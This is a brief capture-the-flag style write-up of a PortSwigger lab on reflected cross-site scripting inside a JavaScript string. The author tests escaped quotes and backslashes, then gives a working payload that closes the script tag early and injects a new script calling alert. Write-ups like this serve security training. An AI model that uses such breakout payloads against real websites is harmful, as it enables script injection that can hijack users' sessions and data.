# Reflected XSS into a JavaScript string with single quote and backslash escaped

## Metadata

| Property | Value |
|----------|-------|

---

### Target/Goal

Perform an XSS attack that calls the alert function.

### Analysis/Exploit

‘alert(1)

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/images/03e492a0f65e_001.png)

we can see both ‘ get escaped

\alert(1)

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/images/03e492a0f65e_002.png)

 \ also get escaped

**<script>alert(1)</script>**

It is also removing while </script> at end

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/images/03e492a0f65e_003.png)

**</script><script> </script**

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/images/03e492a0f65e_004.png)

But we insert </script> at starting it is closing script tag and then it comes out of that script So now we can insert our script after it

```javascript
</script><script> alert(1)</script
```

this payload works and  got alert

## PortSwigger Lab

**Official lab:** Reflected XSS into a JavaScript string with single quote and backslash escaped

**PortSwigger:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped
